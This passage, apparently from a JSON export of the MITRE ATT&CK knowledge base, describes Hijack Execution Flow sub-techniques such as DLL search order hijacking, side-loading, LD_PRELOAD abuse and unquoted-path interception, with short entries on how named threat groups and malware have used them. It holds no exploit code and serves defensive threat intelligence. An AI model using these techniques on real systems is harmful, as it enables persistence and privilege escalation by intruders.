                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. [1][2] Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, [3] by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.[4] Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. [5]Phantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.[6] They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.[7][8][9]If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "Procedure": {
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> has used search order hijacking to execute malicious payloads, such as Winnti RAT.[10]"
                    },
                    "G0143": {
                        "ID": "G0143",
                        "Name": "Aquatic Panda",
                        "Description": "<name> has used DLL search-order hijacking to load exe, dll, and dat files into memory.[11]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> can launch itself via DLL Search Order Hijacking.[12]"
                    },
                    "G0135": {
                        "ID": "G0135",
                        "Name": "BackdoorDiplomacy",
                        "Description": "<name> has executed DLL search order hijacking.[13]"
                    },
                    "S0415": {
                        "ID": "S0415",
                        "Name": "BOOSTWRITE",
                        "Description": "<name> has exploited the loading of the legitimate Dwrite.dll file by actually loading the gdi library, which then loads the gdiplus library and ultimately loads the local Dwrite dll.[14]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> has used search order hijacking to load a malicious payload DLL as a dependency to a benign application packaged in the same ISO.[15]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> has used search order hijacking to load a malicious DLL.[16]"
                    },
                    "G1021": {
                        "ID": "G1021",
                        "Name": "Cinnamon Tempest",
                        "Description": "<name> has used search order hijacking to launch Cobalt Strike Beacons.[17][18]"
                    },
                    "S0538": {
                        "ID": "S0538",
                        "Name": "Crutch",
                        "Description": "<name> can persist via DLL search order hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive.[19]"
                    },
                    "S0134": {
                        "ID": "S0134",
                        "Name": "Downdelph",
                        "Description": "<name> uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.[20]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> contains modules that can discover and exploit various DLL hijacking opportunities.[21]"
                    },
                    "G0120": {
                        "ID": "G0120",
                        "Name": "Evilnum",
                        "Description": "<name> has used the malware variant, TerraTV, to load a malicious DLL placed in the TeamViewer directory, instead of the original Windows DLL located in a system folder.[22]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "A <name> variant uses DLL search order hijacking.[23][24]"
                    },
                    "S0661": {
                        "ID": "S0661",
                        "Name": "FoggyWeb",
                        "Description": "<name>'s loader has used DLL Search Order Hijacking to load malicious code instead of the legitimate version.dll during the Microsoft.IdentityServer.ServiceHost.exe execution process.[25]"
                    },
                    "S0009": {
                        "ID": "S0009",
                        "Name": "Hikit",
                        "Description": "<name> has used DLL Search Order Hijacking to load oci.dll as a persistence mechanism.[26]"
                    },
                    "S0070": {
                        "ID": "S0070",
                        "Name": "HTTPBrowser",
                        "Description": "<name> abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.[27]"
                    },
                    "S1097": {
                        "ID": "S1097",
                        "Name": "HUI Loader",
                        "Description": "<name> can be deployed to targeted systems via legitimate programs that are vulnerable to DLL search order hijacking.[18]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.[28]"
                    },
                    "S0530": {
                        "ID": "S0530",
                        "Name": "Melcoz",
                        "Description": "<name> can use DLL hijacking to bypass security controls.[12]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used DLL search order hijacking.[29]"
                    },
                    "S0280": {
                        "ID": "S0280",
                        "Name": "MirageFox",
                        "Description": "<name> is likely loaded via DLL hijacking into a legitimate McAfee binary.[30]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "<name> has the ability to use DLL search order hijacking for installation on targeted systems.[31]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name> contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes.[32][33]"
                    },
                    "S0113": {
                        "ID": "S0113",
                        "Name": "Prikormka",
                        "Description": "<name> uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory.[34]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> can hijack outdated Windows application dependencies with malicious versions of its own DLL payload.[35]"
                    },
                    "S0153": {
                        "ID": "S0153",
                        "Name": "RedLeaves",
                        "Description": "<name> is launched through use of DLL search order hijacking to load a malicious dll.[36]"
                    },
                    "G0048": {
                        "ID": "G0048",
                        "Name": "RTM",
                        "Description": "<name> has used search order hijacking to force TeamViewer to load a malicious DLL.[37]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has performed DLL search order hijacking to execute their payload.[38]"
                    },
                    "G0131": {
                        "ID": "G0131",
                        "Name": "Tonto Team",
                        "Description": "<name> abuses a legitimate and signed Microsoft executable to launch a malicious DLL.[39]"
                    },
                    "S0612": {
                        "ID": "S0612",
                        "Name": "WastedLocker",
                        "Description": "<name> has performed DLL hijacking before execution.[40]"
                    },
                    "S0109": {
                        "ID": "S0109",
                        "Name": "WEBC2",
                        "Description": "Variants of <name> achieve persistence by using DLL search order hijacking, usually by copying the DLL file to %SYSTEMROOT% (C:\\WINDOWS\\ntshrui.dll).[41]"
                    },
                    "G0107": {
                        "ID": "G0107",
                        "Name": "Whitefly",
                        "Description": "<name> has used search order hijacking to run the loader Vcrodat.[42]"
                    }
                }
            },
            "002": {
                "name": "DLL Side-Loading",
                "href": "/techniques/T1574/002",
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.[1]",
                "Procedure": {
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "<name> launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.[2]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has been known to side load DLLs with a valid version of Chrome with one of their tools.[3][4]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder).[5][6][7]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used legitimate executables to perform DLL side-loading of their malware.[8]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "<name> typically loads its DLL file into a legitimate signed Java or VMware executable.[9][10]"
                    },
                    "S0127": {
                        "ID": "S0127",
                        "Name": "BBSRAT",
                        "Description": "DLL side-loading has been used to execute <name> through a legitimate Citrix executable, ssonsvr.exe. The Citrix executable was dropped along with <name> by the dropper.[11]"
                    },
                    "G0098": {
                        "ID": "G0098",
                        "Name": "BlackTech",
                        "Description": "<name> has used DLL side loading by giving DLLs hardcoded names and placing them in searched directories.[12]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has used legitimate applications to side-load malicious DLLs.[13]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> has loaded a malicious DLL by spoofing the name of the legitimate Version.DLL  and placing it in the same folder as the digitally-signed Microsoft binary OneDriveUpdater.exe.[14]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used side loading to place malicious DLLs in memory.[15]"
                    },
                    "S1041": {
                        "ID": "S1041",
                        "Name": "Chinoxy",
                        "Description": "<name> can use a digitally signed binary (\"Logitech Bluetooth Wizard Host Process\") to load its dll into memory.[16]"
                    },
                    "G1021": {
                        "ID": "G1021",
                        "Name": "Cinnamon Tempest",
                        "Description": "<name> has abused legitimate executables to side-load weaponized DLLs.[17]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> can store a file named mpsvc.dll, which opens a malicious mpsvc.mui file, in the same folder as the legitimate Microsoft executable MsMpEng.exe to gain execution.[18][19]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> includes one infection vector that leverages a malicious \"KeyScramblerE.DLL\" library that will load during the execution of the legitimate KeyScrambler application.[20]"
                    },
                    "S0354": {
                        "ID": "S0354",
                        "Name": "Denis",
                        "Description": "<name> exploits a security vulnerability to load a fake DLL and execute its code.[5]"
                    },
                    "S0384": {
                        "ID": "S0384",
                        "Name": "Dridex",
                        "Description": "<name> can abuse legitimate Windows executables to side-load malicious DLL files.[21]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has placed a malicious payload in %WINDIR%\\SYSTEM32\\oci.dll so it would be sideloaded by the MSDTC service.[22]"
                    },
                    "S0624": {
                        "ID": "S0624",
                        "Name": "Ecipekac",
                        "Description": "<name> can abuse the legitimate application policytool.exe to load a malicious DLL.[23]"
                    },
                    "S0554": {
                        "ID": "S0554",
                        "Name": "Egregor",
                        "Description": "<name> has used DLL side-loading to execute its payload.[24]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has used IISCrack.dll as a side-loading technique to load a malicious version of httpodbc.dll on old IIS Servers (CVE-2001-0507).[25]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "<name> uses DLL side-loading to load malicious programs.[26][27]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> used DLL side-loading to covertly load PoisonIvy into memory on the victim machine.[28]"
                    },
                    "S0032": {
                        "ID": "S0032",
                        "Name": "gh0st RAT",
                        "Description": "A <name> variant has used DLL side-loading.[29]"
                    },
                    "S0477": {
                        "ID": "S0477",
                        "Name": "Goopy",
                        "Description": "<name> has the ability to side-load malicious DLLs with legitimate applications from Kaspersky, Microsoft, and Google.[6]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name>\u2019s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the OINFO12.OCX dynamic link library.[30]"
                    },
                    "S0070": {
                        "ID": "S0070",
                        "Name": "HTTPBrowser",
                        "Description": "<name> has used DLL side-loading.[31]"
                    },
                    "S0398": {
                        "ID": "S0398",
                        "Name": "HyperBro",
                        "Description": "<name> has used a legitimate application to sideload a DLL to decrypt, decompress, and run a payload.[32][33]"
                    },
                    "S0528": {
                        "ID": "S0528",
                        "Name": "Javali",
                        "Description": "<name> can use DLL side-loading to load malicious DLLs into legitimate executables.[34]"
                    },
                    "S0585": {
                        "ID": "S0585",
                        "Name": "Kerrdown",
                        "Description": "<name> can use DLL side-loading to load malicious DLLs.[35]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has replaced win_fw.dll, an internal component that is executed during IDA Pro installation, with a malicious DLL to download and execute a payload.[36]"
                    },
                    "S1101": {
                        "ID": "S1101",
                        "Name": "LoFiSe",
                        "Description": "<name> has been executed as a file named DsNcDiag.dll through side-loading.[37]"
                    },
                    "S0582": {
                        "ID": "S0582",
                        "Name": "LookBack",
                        "Description": "<name> side loads its communications module as a DLL into the libcurl.dll loader.[38]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has used legitimate executables such as winword.exe and igfxem.exe to side-load their malware.[39][40]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as UPPERCUT.[41][42][43]"
                    },
                    "S1059": {
                        "ID": "S1059",
                        "Name": "metaMain",
                        "Description": "<name> can support an HKCMD sideloading start method.[44]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has side-loaded its malicious DLL file.[45][46][47]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> maintains persistence on victim networks through side-loading dlls to trick legitimate programs into running malware.[48]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has used a legitimately signed executable to execute a malicious payload within a DLL file.[49][50][51]"
                    },
                    "G0019": {
                        "ID": "G0019",
                        "Name": "Naikon",
                        "Description": "<name> has used DLL side-loading to load malicious DLL's into legitimate executables.[52]"
                    },
                    "S0630": {
                        "ID": "S0630",
                        "Name": "Nebulae",
                        "Description": "<name> can use DLL side-loading to gain execution.[53]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> loaders can be side-loaded with legitimate and signed executables including the  VLC.exe media player.[37]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors used the legitimate Windows services IKEEXT and PrintNotify to side-load malicious DLLs.[54]"
                    },
                    "S0664": {
                        "ID": "S0664",
                        "Name": "Pandora",
                        "Description": "<name> can use DLL side-loading to execute malicious payloads.[33]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "A <name> .dll that contains BADNEWS is loaded and executed using DLL side-loading.[55]"
                    },
                    "S1102": {
                        "ID": "S1102",
                        "Name": "Pcexter",
                        "Description": "<name> has been distributed and executed as a DLL file named Vspmsg.dll via DLL side-loading.[37]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "<name> has used DLL side-loading to evade anti-virus.[4][31][56][41][57][18][58]"
                    },
                    "S1046": {
                        "ID": "S1046",
                        "Name": "PowGoop",
                        "Description": "<name> can side-load Goopdate.dll into GoogleUpdate.exe.[48][59]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has the ability to use DLL side-loading for execution.[60]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> can use side-loading to run malicious executables.[53]"
                    },
                    "S0662": {
                        "ID": "S0662",
                        "Name": "RCSession",
                        "Description": "<name> can be installed via DLL side-loading.[61][18][58]"
                    },
                    "S0074": {
                        "ID": "S0074",
                        "Name": "Sakula",
                        "Description": "<name> uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.[62]"
                    },
                    "G1008": {
                        "ID": "G1008",
                        "Name": "SideCopy",
                        "Description": "<name> has used a malicious loader DLL file to execute the credwiz.exe process and side-load the malicious payload Duser.dll.[63]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe.[64]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> can load DLLs through vulnerable legitimate executables.[33]"
                    },
                    "S0098": {
                        "ID": "S0098",
                        "Name": "T9000",
                        "Description": "During the <name> installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.[65]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has used DLL side-loading, including by using legitimate Kaspersky antivirus variants as well as rc.exe, a legitimate Microsoft Resource Compiler.[31][66][67][32][68]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools.[69][70]"
                    },
                    "S0579": {
                        "ID": "S0579",
                        "Name": "Waterbear",
                        "Description": "<name> has used DLL side loading to import and load a malicious DLL loader.[12]"
                    },
                    "S0176": {
                        "ID": "S0176",
                        "Name": "Wingbird",
                        "Description": "<name> side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.[71][72]"
                    },
                    "S0230": {
                        "ID": "S0230",
                        "Name": "ZeroT",
                        "Description": "<name> has used DLL side-loading to load malicious payloads.[73][74]"
                    }
                }
            },
            "004": {
                "name": "Dylib Hijacking",
                "href": "/techniques/T1574/004",
                "description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.[1][2][3][4] Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.[5][6][7]",
                "Procedure": {
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> has a dylib hijacker module that generates a malicious dylib given the path to a legitimate dylib of a vulnerable application.[8]"
                    }
                }
            },
            "005": {
                "name": "Executable Installer File Permissions Weakness",
                "href": "/techniques/T1574/005",
                "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors.[1] [2] If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
                "Procedure": {}
            },
            "006": {
                "name": "Dynamic Linker Hijacking",
                "href": "/techniques/T1574/006",
                "description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.[1][2][3] These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.[4]On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the export command, setenv function, or putenv function. Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python\u2019s os.environ.On Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or /etc/ld.so.preload file.[1][2] Libraries specified by LD_PRELOAD are loaded and mapped into memory by dlopen() and mmap() respectively.[5][6] [7][8] On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the DYLD_INSERT_LIBRARIES environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.[9][10][11]",
                "Procedure": {
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> has configured payloads to load via LD_PRELOAD.[12]"
                    },
                    "S1105": {
                        "ID": "S1105",
                        "Name": "COATHANGER",
                        "Description": "<name> copies the malicious file /data2/.bd.key/preload.so to /lib/preload.so, then launches a child process that executes the malicious file /data2/.bd.key/authd as /bin/authd with the arguments /lib/preload.so reboot newreboot 1.[13] This injects the malicious preload.so file into the process with PID 1, and replaces its reboot function with the malicious newreboot function for persistence."
                    },
                    "S0377": {
                        "ID": "S0377",
                        "Name": "Ebury",
                        "Description": "<name> has injected its dynamic library into descendent processes of sshd via LD_PRELOAD.[14]"
                    },
                    "S0394": {
                        "ID": "S0394",
                        "Name": "HiddenWasp",
                        "Description": "<name> adds itself as a shared object to the LD_PRELOAD environment variable.[15]"
                    },
                    "S0601": {
                        "ID": "S0601",
                        "Name": "Hildegard",
                        "Description": "<name> has modified /etc/ld.so.preload to intercept shared library import functions.[16]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.[17]"
                    },
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "<name> adds malicious file paths to the DYLD_FRAMEWORK_PATH and DYLD_LIBRARY_PATH environment variables to execute malicious code.[18]"
                    }
                }
            },
            "007": {
                "name": "Path Interception by PATH Environment Variable",
                "href": "/techniques/T1574/007",
                "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.For example, on Windows if an adversary places a malicious program named \"net.exe\" in C:\\example path, which by default precedes C:\\Windows\\system32\\net.exe in the PATH environment variable, when \"net\" is executed from the command-line the C:\\example path will be called instead of the system's legitimate executable at C:\\Windows\\system32\\net.exe. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a Command and Scripting Interpreter.[1]Adversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the $PATH variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, Unix Shell Configuration Modification, or modifying the /etc/paths.d folder contents.[2][3][4]",
                "Procedure": {
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> overrides the %windir% environment variable by setting a Registry key, HKEY_CURRENT_User\\Environment\\windir, to an alternate command to execute a malicious AutoIt script. This allows <name> to run every time the scheduled task DiskCleanup is executed as this uses the path value %windir%\\system32\\cleanmgr.exe for execution.[5]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> contains modules that can discover and exploit path interception opportunities in the PATH environment variable.[6]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name> contains a collection of Privesc-PowerUp modules that can discover and exploit path interception opportunities in the PATH environment variable.[7][8]"
                    }
                }
            },
            "008": {
                "name": "Path Interception by Search Order Hijacking",
                "href": "/techniques/T1574/008",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program. [1] [2] [3] However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.For example, \"example.exe\" runs \"cmd.exe\" with the command-line argument net user. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then cmd.exe /C net user will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. [4]Search order hijacking is also a common practice for hijacking DLL loads and is covered in DLL Search Order Hijacking.",
                "Procedure": {
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> contains modules that can discover and exploit search order hijacking vulnerabilities.[5]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name> contains a collection of Privesc-PowerUp modules that can discover and exploit search order hijacking vulnerabilities.[6][7]"
                    }
                }
            },
            "009": {
                "name": "Path Interception by Unquoted Path",
                "href": "/techniques/T1574/009",
                "description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.Service paths [1] and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\\unsafe path with space\\program.exe vs. \"C:\\safe path with space\\program.exe\"). [2] (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\\program files\\myapp.exe, an adversary may create a program at C:\\program.exe that will be run instead of the intended program. [3] [4]This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
                "Procedure": {
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> contains modules that can discover and exploit unquoted path vulnerabilities.[5]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name> contains a collection of Privesc-PowerUp modules that can discover and exploit unquoted path vulnerabilities.[6][7]"
                    }
                }
            },
            "010": {
                "name": "Services File Permissions Weakness",
                "href": "/techniques/T1574/010",
                "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
                "Procedure": {
                    "S0089": {
                        "ID": "S0089",
                        "Name": "BlackEnergy",
                        "Description": "One variant of <name> locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence.[1]"
                    }
                }
            },
            "011": {
                "name": "Services Registry Permissions Weakness",
                "href": "/techniques/T1574/011",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. [1][2]If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).Adversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the FailureCommand key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.[3][4]The Performance key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.[5] If the Performance key is not already present and if an adversary-controlled user has the Create Subkey permission, adversaries may create the Performance key in the service\u2019s 